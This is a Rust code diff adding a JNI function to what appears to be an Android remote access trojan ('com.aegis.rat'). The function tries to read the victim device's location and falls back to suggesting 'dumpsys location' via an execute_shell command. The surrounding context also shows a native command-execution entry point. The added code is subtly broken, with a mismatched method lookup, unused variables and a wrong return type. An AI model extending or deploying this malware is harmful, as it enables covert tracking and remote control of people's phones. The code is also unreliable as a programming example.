@@ -84,6 +84,28 @@ pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeInit(
     
     JNI_TRUE
 }
+        #[no_mangle]
+pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeGetLocation(
+    mut env: JNIEnv,
+    _class: JClass,
+) -> jstring {
+    // 1. Get Context
+    let context = match *CONTEXT.lock().unwrap() {
+        Some(c) => c,
+        None => return env.new_string("ERROR: NO CONTEXT").unwrap().into_raw(),
+    };
+
+  
+    
+    let lm_class = env.find_class("android/location/LocationManager").unwrap();
+    let get_location_manager = env.get_method_id(&lm_class, "getSystemService", "(Ljava/lang/String;)Landroid/location/LocationManager;").unwrap();
+  
+    
+    json!({
+        "provider": "shell",
+        "data": "Use execute_shell with 'dumpsys location' for raw data"
+    }).to_string()
+}
 
 #[no_mangle]
 pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeExecuteCommand(
